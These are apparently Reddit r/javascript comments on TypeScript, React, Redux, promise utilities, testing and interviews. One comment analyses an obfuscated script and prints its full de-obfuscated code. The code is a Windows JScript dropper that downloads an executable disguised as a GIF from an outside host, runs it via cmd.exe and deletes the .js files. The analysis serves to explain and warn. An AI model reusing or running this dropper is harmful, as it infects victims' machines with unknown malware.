Cool, thanks! My shop uses almost exclusively‚Äã one-off anonymous functions for this sort of thing which is why I'd never come across it. Good to know, though.
Already exists http://zeptojs.com/
Typescript seems to have more community adoption (typings support), better tooling support, also offers ESnext transpilation (so you don't need Babel), and can target ES6, ES5, ES3. Perhaps the most important factor is it is designed and primarily implemented by one of the best tool authors to ever walk this earth, Anders Hejlsberg ... creator of Turbo Pascal, Delphi, C#, etc.. The man knows how to make productive tools! Trust him.
Why does such a complex tool does not have any tests? I would never use it because of this.
Makes sense: databases are one area where the client-side web definitely has room to grow.
Electron is just a Node based wrapper around Chromium with some packaging options, there's an entire browser instance running that hosts your app. That's why even a small app gets quite large and memory intensive. The browser also limits performance. React-native just needs a javascript engine to execute your code, but the rest of the application (UI, animation, etc) is dealt with natively while events are fed back into your JS thread. 
Google Closure compiler. Can not recommend.
I use flow because it's easier to type pointfree functions. const firstLetterUppercased: string =&gt; string = pipe(split(''), head, toUpper)
He brings up these same arguments over and over again, and the most confusing argument he brings up is the "Fewer API Docs is easier to learn". I have found other threads that equally bring up odd "gotchas!" related to react that you would never have known unless you looked at any documentation or did a bit of digging. I should have saved those. Because he frequently brings up his point of "I just looked at the hello world example and automatically knew how to do it all without any docs!". Which, I guess hey, could be true; he could be incredibly smart.
Guess it's the super slim code
Oh lord
I don't see why you could not concatenate those 3 files.
There's some disadvantages in both approaches (at runtime you'll have to come up with an idea of how to bind event handlers so it doesn't create a new one on every update, while this is solvable at compile time). Compile time transformations introduce another problem (and it's more important IMO), that you can not really compose such constructs unless you are confident about compile time output. There's always a trade off.
Always a tradeoff. Maybe the runtime version can be improved in this sort-of way? class FunCom extends React.Component { constructor(state, callbackFactory) { super(); this.state = state; this.callback = callbackFactory(this.setState.bind(this)); } render() { return this.callback(this.props, this.state); } } const Counter = new FunCom({ val: 0 }, (setState) =&gt; { var decrement = () =&gt; setState({ val: val - 1 }); var increment = () =&gt; setState({ val: val + 1 }); return ({ text }, { val }) =&gt; ( &lt;div&gt; &lt;h1&gt;{text}&lt;/h1&gt; &lt;div&gt; &lt;button onClick={decrement}&gt;-&lt;/button&gt; &lt;span&gt;{val}&lt;/span&gt; &lt;button onClick={increment}&gt;+&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; ); });
Yes Microsoft have wizened up. VSCode is my editor of choice. Typescript and ReactXP is very interesting despite the names I was just trying to be funny :) BUT I will never forget nor forgive their [7000 pages OOXML specification....](https://www.donationcoder.com/Reviews/Archive/WordProcs/Screenshots/06-word07-spec.jpg)
A Promise-specific utility belt, which appears to be what `awaiting.js` is doing. Originally, I used to use Bluebird for everything, though after the introduction of async/ await it became less useful. As a result, I've "ported" the utilities that I use most of the time into Bluefeather. I don't quite understand the logic behind some of the utilities that `awaiting.js` is offering, e.g. * `failure` ‚Äì where would you explicitly expect something to fail? as opposed to expect success and handle failure. * `list` ‚Äì isn't that just `Promise.all`? * `map` ‚Äì fair enough.. you've added concurrency. In general, using `async/ await` one would just wait for a collection and `map` it using `Array#map`. * `result` ‚Äì is that Bluebird's `Promise.try`? * `single` ‚Äì is that Bluebird's `Promise.any`? * `success`, `swallow` sounds like an anti-pattern. * `throw` is a reserved keyword as of ECMAScript 2015
Good idea, why didn't we replace all libraries with IDE templates :) I don't use propTypes TBH
At the end of the day it comes to choosing between runtime abstraction with perf penalty and complex construct but less code or compile time syntax without perf degradation but also with the same amount of code as you'd write by hand
Yes, will work only for instance props. Hoisting is a bad bad thing imo :)
How can something be stateful and functional at the same time? This transform turns arrow functions (inherently stateless) into stateful classes. So you're pretending an arrow function can change its own state, making it impure and therefore not very functional. Interesting idea, but to me this is confusing and breaking JavaScript syntax.
Dressing is a tough one. I think the general rule should be, its better to dress up, than down. But I've seen negative reactions from both ends of the spectrum depending on who's giving the interview. Some like that you took the effort to put something nice on, others think you're trying too hard and it doesn't fit the culture. But I think it shows a certain respect that you dress up, even if, when you get the job, you'll be dressing down.
You may need to reduce your salary and rank expectations and go for a job with a "best practices" environment. It's tough to learn outside of your immediate role, so finding a role that demands what you want to get better at is the best long term bet. Other than that, the ability to learn quickly and a proactive attitude go a long way. Sounds like you're in a tough spot üòì hope his helps. 
I'd rather look over dressed than like a slob personally. I play it by ear though, I've word jeans to plenty of interviews... tshirts not so much
I started `awaiting` for a similar reason - instead of Bluebird I stitch together a bunch of specific node libs like promisify-event all the time, felt a utility belt with a consistent API would be useful. - `failure` is largely for readable testing. Whenever I'm writing tests for promises I end up writing a lot of `try/catch` blocks like [this](https://github.com/hunterloftis/awaiting/blob/master/test/map.test.js#L9-L17). - `list`is Promise.all with the option to ignore some (or all) rejections. - `map` with concurrency (vs using `Array#map`) is critical in node services (where I'm usually working). A good example is [Heroku's nodebin service](https://nodebin.herokai.com/), which checks/mirrors all of the hundreds of node versions/bins every ten minutes. If I made a collection of promises for all those network requests, the service would be rate-limited/blacklisted. - `result` isn't `try` (it's `finally`) - `single` is `any` - `success`, `swallow` - `swallow` is an anti-pattern, but it's useful when you depend on a lib that doesn't handle a rejection. There's nothing you can do about it, but in current versions of node you'll get a `console.error` with the rejection and a `console.warn` with a deprecation notice about how future versions of node are going to throw. So if you use that lib a lot your logs are just going to be full of unhandled rejection text that you can't prevent. `success` is useful when you're following "tell-don't-ask" principles, especially as they're commonly implemented in simulations or games: `const target = await a.success(getTarget()); doSomethingWith(target); function doSomethingWith(foo) { if (!foo) return; ...` - `throw` works as a property name (`a.throw`), but I would like to rename it to something which could be used independently. Currently `const foo = require('awaiting').throw` works, but you can't as easily `const { single, map, throw } = require('awaiting')` Any suggestions?
&gt; failure is largely for readable testing. Whenever I'm writing tests for promises I end up writing a lot of try/catch blocks like this. ava has [`t.throws`](https://github.com/avajs/ava#throwsfunctionpromise-error-message) for that reason. Overall, it is a good effort. Documentation.js (I am assuming thats what it is) output is not user friendly, though ‚Äì it does not separate public API from individual entities of the API (like errors).
Do you realize Typescript was released in 2012? Babel came out in late 2014. Typescript originally provided let/const, classes, spread, rest params, arrow functions, classes ... most of ES6 ... long before Babel was even a glimmer in Sebastian's eye ... plus optional static types. It led the vanguard. I wouldn't call it a "small cut that Microsoft curates". For that matter, folks in the Babel community add stuff that isn't ES standard yet too ... such as property initializers used by react folk.
&gt; Can not recommend I think you meant something different?
Why not use a array of images?
So the way I have it set up is the route looks like this Router.get('/:product-name' **Query Prismic.io to find product name** res.render('product', productData) Template: &lt;title&gt;&lt;%-product.title %&gt;&lt;/title&gt; &lt;h1&gt;&lt;%- product.title %&gt;&lt;/h1&gt; &lt;img src="&lt;%- product.imgOne %&gt; /&gt; I'd rather keep that scheme intact without major refactoring. 
Might be easier if you provided code, but in general you're going to need to put your redirect in the `success` or `done` callback for the AJAX deferred object. Setting cookies is not an asynchronous action so you should be able to just redirect after it's set. Using a timeout would not be reliable. $.ajax('/some/url', { type: 'POST', data: { /* data */ }, success: function (data) { // maybe here instead } }) .done(function (data) { document.cookie = 'login=' + data; window.location.href = '/some/authenticated/url'; });
https://github.com/hunterloftis/awaiting/pull/3
Build something that uses the techs you want to incorporate from scratch, no boilerplate. Absolutely none at all. This will be frustrating, but the payoff is what you're looking for. Follow guidelines from "best practices resources" -- this is a semi grey area. As long as you're looking at official docs you should be fine imo
[Not yet](https://github.com/tc39/ecmascript-asyncawait/issues/9#issuecomment-127427447). Good question, I can see how my inline examples would be misleading. I've just updated the first example to clarify that it's two parts (require / use).
I think they were talking about walking into an interview wearing a three-piece suit, when everyone else is wearing a decent pair of pants and shirt on the job.
Nope. I don't like it. No incremental compile, poor to no IDE integration, type annotations are too verbose. It was the best tool available at the time but it's not anymore.
Gotcha. It felt like you left out a word: &gt; ex: Can not recommend *more* ...and I was curious how Closure Compiler "types" (rather notations...) were at all useful.
The compiler does perform type checking depending on its config and will tell you if you violate the type system. I can't compare it to other compilers, my experience is limited. But it's real easy to forget to write down the types and inadvertantly disable type checking since it's all in the doc strings. From what I hear the compiler also uses the types to achieve better compression of the output minified js.
This is the first thing that comes to mind. In your javascript, you could have a function that starts a timer to redirect the page and another function that kills that timer. You could write those functions as methods on an appropriately named object, say. var redirectTimer = { start: function() { this.timeout = setTimeout(function() { location = 'https://the-url-you-want' }, 30000) }, stop: function() { clearTimeout(this.timeout) } } Then you can add event listeners to your video element. On the 'ended' event you'll call redirectTimer.start, and on the 'loadstart' event you'll call redirectTimer.stop. You should probably also call redirectTimer.stop on at least one other event, like 'seeking', to make sure that if the user goes back through the current video that also kills the timer. 
I was about to submit this to /r/programming instead, but it was already there, and it led to [some interesting non-JS-related comments](https://np.reddit.com/r/programming/comments/3fi0f7/very_enjoyable_collection_of_short_stories_about/).
Awesome, thanks so much man, this is *exactly* what I was looking for. I added function timeout() { mTimeout = setTimeout(function () { window.location.replace("index.html"); }, 20000) } to make it work how I needed.
If it's a HTML5 video... Listen to its `ended` event. On receiving that event, use `setTimeout()` to create the delay and keep track of its timer ID. And on that timer handler, use AJAX to load the HTML resource. Then upon receiving the HTML data, place it on the DOM at the proper node location. Listen to its `play` event. One receiving that event, clear any previously set timer ID.
Jeans and tennis shoes are the norm everywhere I've worked.
I'd love better docs! The examples are just code snippets (not on any level - as you can see they don't include `require` either). There's a full, working example (linked at the top and from GitHub), all of the tests exemplify something (`yarn test`), and I would love to include more runnable examples for clarity. Using `await Promise.all(list.map(asyncFn))` works for small sizes of `list`. However, with almost any `asyncFn`, there's a limit to what you can throw at it. For example, if you were writing something that looked at the 10,000 files in a `node_modules` dep tree, and you used that approach, you'd be asking the filesystem to hold open 10k files simultaneously. If you were writing a scraper, crawler, or mirror that watched a web server, and you tried to make 1,000 simultaneous requests to it, you'd be rate limited / blocked. If you are transcoding videos, and you try to run your transcode fn on 100 at a time, you'll max out your memory and crash. Etc. This is why async map + concurrency is an important tool. I wonder if a doc that explains common scenarios where each is useful might be a good addition - what do you think?
Thanks for mentioning JavaScript Allong√©, started reading immediately! 
Why are you looking for help? What's the intended use of the software? I don't see any Javascript (and very little else) in your Github, what are you bringing to the table? Do you have example of previous success in creating groups to develop software? Also, *whole
Thanks for this. I'm not sure exactly what you mean by "The important thing is having some automation process to catch defects so that you don't cause regression". I have been doing side projects with Angular 2 and using their build tooling w/ Typescript. I have been doing zero testing though.
Sure. My list is obviously heavily React-oriented, but the stuff like "Basic Concepts and Overviews", "Immutable Data", "Webpack Tutorials", "JS Resources", etc, are all non-React-specific.
You can make an xhr call to all links and identify the redirection link in the header. with a recursive function you can make it easily https://en.wikipedia.org/wiki/URL_redirection https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/getResponseHeader
I have think a little bit more on how it worth and believe that 1000$ is a fair price according to my estimation of work needed. I did not decided if I will do it or not, but if you are ready to spend that much, you probably will find someone willingly to do it. Actually, it would be my price if you want to be sure to have a result for the price. The alternative would be to pay me at a rate of 50$ per hour for a hour for any result I can have in whatever time you are ready to pay me. without guarantee. A far better alternative would be to spend as much as you intend to pay me to pay the author of ogario, I'm 100% sure he will give you better result that what I can give you for 1000$. I really wonder why you want to deobfuscate ogario, looks like you are not competent enough to do something useful with the deobfuscated code source as your answers to /u/soph0s seems to hint.
Well, it sounds like with your templating system, that it is looking for variables exposed globally to parse and then embed in your html. I would assume you are trying to pass JavaScript, which is invalid at the time it is built. Try inspecting one of your rendered broken pages and see what attributes were actually passed. For example, src=try{product.image4} catch(e) {} - is invalid JS. Really though, do you want to be passing run-time JS as a prop to your html and just setting the src to null? The better approach is to understand your templating system and tell it not to pass a html element up-front if the data to drive it doesn't exist in the first place. What templating system are you using?
More point free const firstLetterUppercased: string =&gt; compose(toUpper, head, split('')); Having said that you can do it in typescript too. With `compose` from ramda for example you do something like: const flU = compose&lt;string, array, string, string&gt;(toUpper, head, split('')); 
Hi /u/magenta_placenta, this post was removed. Please see our [posting guidelines](http://www.reddit.com/r/javascript/wiki/index) (specifically, _Posting: Showing off a Project_). Please use the [Showoff Saturday](https://www.reddit.com/r/javascript/search?sort=new&amp;restrict_sr=on&amp;q=flair%3AShowoff%2BSaturday) posts for these types of submissions.
When you write a code update how do you know if this new code breaks some feature or support already present in the application? Odds are you probably have no idea, especially if the project is very large and has many features. You will want to ensure that you aren't breaking things when you introduce new code. The way to do this is to run your application in a variety of supported states and validate the outcome of each run against a know good result. If you break a test you will need to investigate why. Something in your application has changed. I also run JSLint in my test build to validate the code. ESLint is more popular but its littered with dependencies so I don't bother with it for personal projects.
&gt; You will want to ensure that you aren't breaking things when you introduce new code. The way to do this is to run your application in a variety of supported states and validate the outcome of each run against a know good result. If you break a test you will need to investigate why. Something in your application has changed. Dumb question, but how do I do this? Is this where integration tests come in?
fwiw I don't know regex very well...above is `yourregexhere` meant to be my unique word?
Hi, *I am looking for help for mutual learning of JavaScript. *The solution will probably be open-source on GitHub -- something we all can use from the group as an authentication solution that will scale well. So short term this is for mutual learning... *I am bringing my quite broad but in some areas intermediate experience as a full stack developer. I have experience for MEAN development in full life cycle apps. The latest website I‚Äôve built is NolimitCity.com. *This is my first attempt at flying solo since I‚Äôve registered my company. Sink or fly this will have my full time commitment every day. *The long term goal will be to implement this security solution into an international website that will offer a content creation service like WIX.com for companies with out-of-the-box functionality for speedy mobile development. *More I have experiences in working in agile teams, not as an project leader. I think however that will not be a problem. If you are interested please get back to me telling me about your expectations and introduce yourself if you feel like it. Cheers -Peter
I'll respond to both of your comments here. 1) nope almost none of it will *but* you can [polyfill](https://en.wikipedia.org/wiki/Polyfill) the functionality with [babel](https://babeljs.io/docs/usage/polyfill/) 2) yep if you wanna test your regex use [a site like regexr](http://regexr.com/)
In IE : Register Link doesn't show all the course. In Chrome: Register Link doesn't let you register when add the username, password. Anyone else having this issue?
Had the same issue on Chrome. When I went back to the site, I actually clicked the Log In button in the navbar and used the username/password I entered before clicking register. Content actually displays now. 
React is a really nice framework but there's _a lot_ of boilerplate. I would not recommend getting into it until you understand it conceptually. Otherwise you'll be doing a lot of copy/pasting and not a lot of understanding. I'd like to mirror what /u/Efraet said and recommend getting your head around the new ES6 stuff as React makes heavy use of the new features and syntax. It would also help to know functional Javascript quite well. The tutorials on https://nodeschool.io/ are extremely good, especially the Functional Javascript one. I learned Angular first and it helped me understand MVC conceptually so at the very least you may want to watch a ton of YouTube videos that explain how the different frameworks operate. Have fun and good luck. Javascript is a really fun language to learn and gets your foot in the door to a lot of other languages. 
If you don't know JS very well yet, React may not be a great start because it requires a lot of tooling, setup and JSX which conflates html markup and JS. you should maybe start out with a view layer that is based on hyperscript and once you get a hang of it, then transition to one that blends html and JS. you can technically do this with React as well by using https://www.npmjs.com/package/react-hyperscript-helpers
/u/yuri_auei 's solution is the better one, honestly. The benefits of putting it in an array are that you don't have to know how many pictures there are going to be (which is really the crux of your issue anyway, right?). With your way, you're putting to much faith into the API. If tomorrow they changed the total number of images to 7, or forever limited it to 2, you will have to refactor every template that has that hardcoded pattern. Additionally, I would go one step further and advise you to "wrap" the API's response into an object you control. That way if the API's attributes changes (ex: product.imgOne changes to product.img_one) then you only have to change it in one place (your function that wraps / converts the API's response) vs ALL of the templates that use that attribute! 
Basically. I disagree. I find text that I can read rapidly and scan around and ctrl-f in much more powerful than video. As well as interactive stuff like codecademy where you can write code along with it.
Happy to help! Have fun w/ it
&gt; but how do I do this? This is where people get stupid. You need some items: * An automation or build system * test criteria (tasks to put into the automation) * validation (how do you know if the tasks produce the proper results) There are a lot of options out there for test automation. There are numerous unit test frameworks, test runners, build jobs, and so forth. You will have to write your test criteria and validation though as these relate to the specifics of your application. When I needed this for my application I got tired of waiting for a generic solution. I needed something that allowed jobs for other software to be easily plugged in, that could run simulations in child processes, and could produce very simple comparisons. I couldn't an existing automation tool that did what I needed so I wrote my own. https://github.com/prettydiff/prettydiff/blob/master/test/lint.js Run this on the command line with node (after you have downloaded the code) `node test/lint.js` When I have showed this to people in the past they immediately start crying about it being a big file. If you are afraid to read software then honestly writing software probably isn't your *cup of tea*. If you are still with me the code actually fairly simple: some utility functions at the top and a few types of automation. The vast majority of the code is actually a few strings representing simulated stdout to the console.
I know millennials cannot live 30 seconds without playing on the damn phone, but really? This is a job interview. People who cannot figure this out *on their own* don't need to be employed. This isn't harsh as its more a natural response to the lack of self-awareness and completely displaced motivation. If they actually *needed* the job they would behave as such.
I wrote about this using reduce() here https://decembersoft.com/posts/promises-in-serial-with-array-reduce/ But also, what is calling this code? Is it waiting for the value that comes from your final reduce() call?
I don't consider Redux to be a "React fundamental". We have a whole advanced course dedicated to Redux.
You're using Q, so you'll want to use `return Promise.promise(...` in asyncFunc
In the last ~4 years, everywhere I've worked it has been the case that production code never depends on 3rd party (non company) CDNs. One could argue this defeats the major benifit of cached libraries being available across very many sites. I think the sucurity (though this sometimes could be fixed with fingerprinting), and predictable availability of 1st party managed CDNs usually outweigh any benifits of 3rd party CDNs. So I don't really see this news being that big a deal. Some things will undoubtedly break, but the things that do are most likely smaller projects. Like mentioned it's also an easy fix.
This is great post
There's really no problem with that but if anything you better have strong JS fundamentals, in React will use a lot of bound functions to control the `this`, if you're using Redux as well you'll definitively need to take a look at the meaning of pure functions. Main thing with JQuery is that it makes you manipulate the DOM in various ways, which eventually turns into spaguethi code, since there's no standard to follow. When switching to something like Angular or React it's like the option to manipulate the DOM yourself or arbitrary creating elements for you needs will be taken away from you, and that's for the better. It's somewhat of a shock but it will pass
Thank you! When I was trying to get into react a while ago every single intro seemed to be a "react-redux-jsx-webpack" deal. Very intimidating!
It uses rather crude obfuscation. The array of values starting with 128 is used as a key for a simple XOR cipher to decrypt the longer string. It then eval's the result. Here's the de-obfuscated code. It merely downloads and runs an executable file, likely from a compromised server. (The URL makes you think it's a GIF, but it's really a windows executable.) That file is likely some kind of dropper/launcher that downloads and runs a bunch of other nasty stuff. function getDataFromUrl(url, callback) { try { var xmlHttp = new ActiveXObject("MSXML2.XMLHTTP"); xmlHttp.open("GET", url, false); xmlHttp.send(); if (xmlHttp.status == 200) { return callback(xmlHttp.ResponseBody, false); } else { return callback(null, true); } } catch (error) { return callback(null, true); } } function getData(callback) { try { getDataFromUrl("http://sonicfopase.top/user.php?f=2.gif", function(result, error) { if (!error) { return callback(result, false); } else { getDataFromUrl("http://sonicfopase.top/user.php?f=2.gif", function(result, error) { if (!error) { return callback(result, false); } else { getDataFromUrl("http://sonicfopase.top/user.php?f=2.gif", function(result, error) { if (!error) { return callback(result, false); } else { return callback(null, true); } }); } }); } }); } catch (error) { return callback(null, true); } } function getTempFilePath() { try { var fs = new ActiveXObject("Scripting.FileSystemObject"); var tmpFileName = "\\" + Math.random().toString(36).substr(2, 9) + ".exe"; var tmpFilePath = fs.GetSpecialFolder(2) + tmpFileName; return tmpFilePath; } catch (error) { return false; } } function saveToTemp(data, callback) { try { var path = getTempFilePath(); if (path) { var objStream = new ActiveXObject("ADODB.Stream"); objStream.Open(); objStream.Type = 1; objStream.Write(data); objStream.Position = 0; objStream.SaveToFile(path, 2); objStream.Close(); return callback(path, false); } else { return callback(null, true); } } catch (error) { return callback(null, true); } } getData(function(data, error) { if (!error) { saveToTemp(data, function(path, error) { if (!error) { try { var wsh = new ActiveXObject("WScript.Shell"); wsh.Run("cmd.exe /c start " + path + " &amp; del *.js"); } catch (error) {} } }); } });
Thanks my dude I appreciate it.
Sorry for the late reply. I plan to fix the sitting at the bottom laser to gain points issue soon, by figuring out the player location, and then shooting the closest laser. Thanks for the feedback!
I disagree with that sentiment. Of all frameworks React is probably the least complex and needs the smallest boilerplate because really all that you use is Javascript functions and classes to declare a component. You are probably referring to a state manager like Redux. While that is indeed more complex in the beginning it isn't needed for React, though it would be the logical next step and is hugely rewarding.
Yep. Dan Abramov (creator of Redux) advises people to focus on React first. I'm a Redux maintainer, and I say the same thing whenever people ask.
This feels like a homework question. So I'll give you a few ideas that can convert to code. So you currently know how to display the images but you need to pick random non repeating images. You can do this two ways A) generate random numbers and keep track of the previously generated numbers. Checking each new number each step. This is the almost straight forward but runs the risk of infinite loops if you're not careful. This is like rolling dice until you get no repeating values B) generate random numbers and remove those entries from the available pool numbers, looping until you get your desired count of random numbers or run out of entries in your pool. This is like drawing numbers out of a bag and not replacing them. Both work just fine for a college lesson and both have their intricacies that make them interesting (if you're feeling ambitious try both and see which you like better)
np
~~I can register and start other courses, but not this free one. Is not working :(~~ Edit: now it's working!
Well, you cannot expect doing "complex" application withnout doing "complex" tasks/work, can you? :) If you want simplier framework, start with simplifying your specification first
On the other hand Redux is pure Javascript and by learning the concept, reducing immutables mostly, one learns to tame complex applications in the most simplistic way, something which traditional MVC cannot do easily or do at all. Flux architecture is the evolution of MVC and since Redux is being used pretty much everywhere these days, including Angular, it makes sense to learn it as well. That's the great thing about React and Redux, it isn't about one framework or one library, these are the current guiding principles of modern web development.
you can put in pattern into your html &lt;input&gt; like: pattern="[0-9]{3}" you could also use regex in your javascipt and you can look into celi() it rounds numbers up, explanation for it here: [celi here](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math/ceil)
Vue is comparable to Angular in scope, it is by far the more complex framework. React ist just a small view layer with very few abstractions. But you should understand [modern Javascript](http://exploringjs.com/es6/index.html#toc_ch_first-steps) to some extend. If that's lacking you'll have a harder time. If you know your language you know most of React. React encourages best practices when it comes to build systems but you can of course use [script tags without build tools](https://www.reddit.com/r/javascript/comments/62pbxk/trying_to_find_ways_of_learning_react_without/dfot9o3/) just like in Vue, but you're shooting yourself in the foot. Even in Vue you get penalized as you can't use single file components and you need extra dependencies.
Just started building a React-Native app with a "Redux ONLY when necessary" policy. So far, hasn't been necessary. Used EventEmitter instead and its working out beautifully. 
I did not judge React, just personal experience. Here is my thought about vue: Vue is easy to dive in. script tag is a good starting point, unless you have aready used webpack before. webpack is just a bundle tool, if you don't have any module-based experience, you need to learn module programming techniques first, not webpack. And when you learn components of Vue, you will love single-file component, cuz it has syntax highlights, logic separation. Now bundle tool--webpack or others is required. This experience is very natural, you totally know the point of all these tools. For vue, it is just super simple, I think it is just as easy as jquery, the core concepts are: directives,vue instance which includes properties, data, methods, events. You use vue instance just like you use $ in jquery.And you can create instances as much as you need. You code html elements like before, create vue instance which is a proxy for all your javascript data related to your program logics, add directives to html elements to affect its behaviors, create event, attach event handlers. Components are just piece of code that hold all the things that they need to be rendered. For communications between components: properties down, events up. Now you know how to interact with doms(use directives), how to split logic to components, how to comunicate between components, you know vue.js. I will back to Node.js, and build some real things. 
In the `parseText` function your `podcast` variable is an integer that you use to index the `podcasts` array. Doing `re = regExpPodcast(podcast);` passes the counter to the regex builder. You probably meant to write `re = regExpPodcast(podcasts[podcast]);`
I wish you had a free Redux course, too :( Thank you for giving us this one though 
If it's any consolation, I was in a similar boat a couple of years back, and I took a job that I knew would challenge me (JS developer for an agile environment). I had up to that point been a "lone wolf" at a small web studio who had dabbled in JavaScript SPAs but was primarily at the time a backend developer. It's been nothing but great for my career and my personal development since. As for advice, I [recently offered some in another thread](https://www.reddit.com/r/javascript/comments/5vpxed/tips_for_javascript/de3w728/), and the only thing I would add is [Clean Code Javascript](https://github.com/ryanmcdermott/clean-code-javascript), a JS-specific adaptation of Robert Martin's "Clean Code" principles. (edit: context)
axios
Of the two options you mentioned directly, use fetch and node-fetch. Fetch is a standard. It's what the client side of the web is (and will be) using. If you want to actually standardize on something across the lines, pick a real standard. [Request](https://github.com/request/request) is just a popular node library. If you're going to standardize on something non-standard, evaluate all the browser + node options and just pick the one you like best. [Superagent](https://github.com/visionmedia/superagent) is solid. [Axios](https://github.com/mzabriskie/axios) is popular but has many open issues.
You would agree with most of my co-workers then. :P On the other hand, I learned with the help of both forums and videos online. The videos often really helped clarify things for me, as I am an audio/visual learner. But I do see what you mean! It's definitely not for everyone.
Thank you so much, Mr Wizard. I really appreciate that! I hope you find them helpful. :) I'll keep putting out 2 a week.
Haha, even the function looks weary with how terse it is.
the fact you can make the code only run on a specific domain is actually quite cool
do you have a framework you prefer?
naming conventions, they'll fuck you up every time. this is why i/j/index are so standard.
I'm currently a big ReactJS fan and am working in MERN Stack. I get annoyed at how obtrusive it is sometimes, but it's been really fun! You?
currently trying to figure out which one is best for me. working on a graphically (canvas) intensive incremental. picking a framework has been a challenge
beware of the old school anonymous function with this ... for example for updateLanguage, you can call with ES6 syntax for transmitting the this element : onClick ={() =&gt; this.updateLanguage(lang)} and not onClick = {this.updateLanguage.bind(null,lang)} which is like very old method ... 
Battle? Eh, bullshit title. We got better keywords with better scope rules. `var` is not fighting back, but instead going gracefully in to the good night.
I've never tried redux, this has always seemed like the default logic for angular to me so I've always implemented something very similar to this. I'm wondering what downsides this could have, or whether there are any improvements that could be made to this logic when handling large datasets.
Hi /u/mariushe, it looks like you're new to reddit, welcome! Thanks for the submissions, but please make sure you read http://www.reddit.com/rules and our [guidelines](http://www.reddit.com/r/javascript/wiki/index). In short, you should post from a variety of sources, and not just `deadcoderising.com`. Thanks for your consideration! domain submitted from|count|% :-|-:|-: [deadcoderising.com](/search?q=%28and+site%3A%27deadcoderising.com%27+author%3A%27mariushe%27+is_self%3A0+%29&amp;restrict_sr=off&amp;sort=new&amp;syntax=cloudsearch&amp;feature=legacy_search)|18|95%
The consensus is that we like Typescript (and Flow) a lot, and that you should use one or the other on any mid-to-large scale project.
exactly what i wanted ^_^
I know nothing of Angular but we use TypeScript with React extensively. I honestly don't want to go back to writing regular JavaScript. My main reason is because debugging simple issues like what is in an object become nonsensical. Interfaces provide contracts for objects to follow, this avoids the problem of having to run the app, find out that you are calling the method wrong (either typing mistake or on the wrong object), and continuing this loop process. You still have to write tests but tests no longer become about what you are passing in and doing type checking. 
Nothing wrong with that, and I would definitely say the benefits of static type-checking don't quickly become apparent until the application becomes very large with a lot of moving pieces. I would just say that in any JavaScript application you are dealing with typing. TypeScript and Flow just help you find type errors more easily, while editing your code instead of while running it. The common practice of duck typing in JavaScript is highly compatible with the structural typing systems that TS and Flow have. And if you have to write tons of overloaded signatures (keep in mind a TypeScript method with 10 signatures still only has one implementation, just like JavaScript), I would say it's a good sign that your method is very complex and you might want to think about refactoring and focusing on interfaces. After all, even if JavaScript doesn't make you explicitly declare all your method signatures, you're still going to have to describe them all in your documentation!
What's painful about using JS libraries..? You can just import them the classic way using `require` or whatever and cast the type to `any`. Granted you won't get any type support, but then that's just a result of the library not being written in TS or having TS definition files. What libraries were you specifically having trouble with?
We have an ES6 for React course which discusses everything related to ES6+ (besides Classes). I didn't want ES6 to be a prereq to the course.
`performance.now` has microsecond precision, but not necessarily microsecond accuracy. For benchmarking purposes, this is an important difference. In order of least accurate to most accurate: - new Date().getTime() - millisecond precision, accurate to approx. hundredth of a second - Date.now - slightly more accurate than 1) due to less calling overhead - performance.now() - microsecond precision - console.time / console.timeEnd (in Chrome) - better microsecond precision, but extremely sensitive to statistical errors - benchmark.js - microsecond precision, and statistically normalized You can still get interference from things like GC and JIT, especially in microbenchmarks (i.e. the types that measure native calls or low level operations), so ideally, you should try to measure high level functions with realistic inputs, rather than measure micro-optimizations.
Great thx ... sorry it just that the course about "this" is indeed really interesting but I through there is too many focus on this subject ...
No need to be sorry. It's a great argument with really strong pros and cons to both sides. 
Main advantage for typescript would be autocompletion and navigation for smart IDEs/editors, in which javascript is still really weak. You'll not run into these problems in solo projects or something like that, but in big projects it could be a pain to track a particular class/object declaration and look at what methods it does have, this leads to loss of time and efficiency.
This. Happily waving goodbye to the era of logging out some library's instance methods just to see what it's making available. 
Lots of people use it. Some of the most famous users are Guild Wars 2 (one of the core contributors work there) and Lichess.org
apparently an unpopular opinion here, but having recently used typescript for the first time in an angular project, I am unimpressed. I do not use an IDE, so I don't get any direct benefit from it. The types of errors it prevents seem obvious and easy to prevent without all the overhead. The errors it shows are difficult to read and not always obvious to debug. At times it can get in the way by being too overzealous with vendor code. It is tedious to write and wordy to read. Changing attributes of a widely used object can be an incredibly arduous task, again for very little benefit. Ultimately, to me, it feels like way more trouble than it's worth, and the costs far outweigh the supposed benefits. Lots of people seem to love it, but I do not share that love. Just my opinion.
thank you! I have been on very large projects, so I do understand where you're coming from there. To me THAT is a very valid reason that should be promoted a little more then simply "because types". Thanks!